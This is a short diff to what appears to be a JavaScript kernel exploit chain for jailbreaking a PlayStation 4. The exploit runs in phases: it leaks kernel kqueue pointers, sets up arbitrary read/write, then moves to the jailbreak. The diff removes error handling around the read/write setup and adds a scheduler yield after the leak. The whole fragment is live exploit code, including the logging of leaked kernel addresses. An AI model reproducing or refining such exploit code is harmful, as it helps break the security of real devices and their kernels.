@@ -982,15 +982,7 @@ function exploit_phase_leak() {
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
-  if (exploit_end) return;
-  try {
-    setup_arbitrary_rw();
-  } catch (e) {
-    log('R/W setup failed — Restart your ps4...');
-    cleanup();
-    sched_yield();
-    return;
-  }
+  setup_arbitrary_rw();
   log('R/W OK — moving to jailbreak...');
   log('Stability by M.ELHOUT');
   yield_to_render(exploit_phase_jailbreak);
@@ -1519,6 +1511,7 @@ function leak_kqueue() {
   }
   debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
   close(kq);
+  sched_yield();
 
   // إعادة بناء triplets[1] بعد ما استخدمناه في free
   triplets[1] = find_triplet(triplets[0], triplets[2]);
